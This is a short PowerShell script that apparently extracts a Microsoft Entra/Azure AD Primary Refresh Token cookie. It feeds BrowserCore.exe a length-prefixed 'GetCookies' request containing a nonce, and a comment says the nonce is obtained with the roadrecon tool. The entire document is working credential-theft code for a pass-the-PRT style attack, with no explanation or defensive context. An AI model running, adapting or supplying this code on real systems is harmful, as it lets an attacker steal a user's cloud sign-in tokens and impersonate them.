Function Get-RefreshToken($nonce) {

	$body = "{""method"":""GetCookies"",""uri"":""https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=$nonce"",""sender"":""https://login.microsoftonline.com""}"
	$bodyLength = $body.Length
	$bytes = [System.BitConverter]::GetBytes($bodyLength)

	$startInfo = New-Object System.Diagnostics.ProcessStartInfo
	$startInfo.FileName = "C:\Program Files\Windows Security\BrowserCore\BrowserCore.exe"
	$startInfo.RedirectStandardInput = $true
	$startInfo.RedirectStandardError = $true
	$startInfo.RedirectStandardOutput = $true
	$startInfo.UseShellExecute = $false

	$p = New-Object System.Diagnostics.Process
	$p.StartInfo = $startInfo
	$p.Start() | Out-Null

	$writer = $p.StandardInput
	$writer.BaseStream.Write($bytes, 0 , 4)
	$writer.Write($body)

	$writer.Close()

	$p.WaitForExit()

	$stdout = $p.StandardOutput.ReadToEnd()
	$stderr = $p.StandardError.ReadToEnd()

	Write-Host $stdout
	#Write-Host $stderr
	#Write-Host $p.ExitCode
}



# Required argument
$nonce = $args[0] # sh > roadrecon auth --prt-init | awk '{print $9}'



Get-RefreshToken $nonce
